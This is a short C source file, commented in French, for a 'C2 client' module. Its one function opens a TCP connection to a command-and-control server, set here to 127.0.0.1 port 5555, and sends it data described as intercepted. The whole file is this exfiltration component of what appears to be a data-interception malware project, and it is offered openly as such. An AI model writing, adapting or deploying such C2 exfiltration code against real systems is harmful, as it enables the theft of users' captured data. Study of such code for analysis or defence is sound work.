#include "c2_client.h"
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>

// Adresse IP et port du serveur C2 (Command & Control)
#define C2_IP "127.0.0.1"  // L'adresse locale, 
#define C2_PORT 5555        // Port sur lequel le serveur C2 écoute

// Fonction permettant d'envoyer des données interceptées au serveur C2
void c2_send(const char *data) {
    int sock;
    struct sockaddr_in server_addr;

    // Création d'un socket pour communiquer avec le serveur C2
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("[C2_CLIENT] socket"); // si erreur lors de la création du socket
        return;
    }

    // Configuration des paramètres du serveur C2
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(C2_PORT);  // Conversion du port en format réseau
    server_addr.sin_addr.s_addr = inet_addr(C2_IP);  // Conversion de l'adresse IP

    // Connexion au serveur C2
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("[C2_CLIENT] connect"); // Échec de la connexion
        close(sock);
        return;
    }

    // Envoi des données interceptées au serveur C2
    send(sock, data, strlen(data), 0);

  
    close(sock);
}
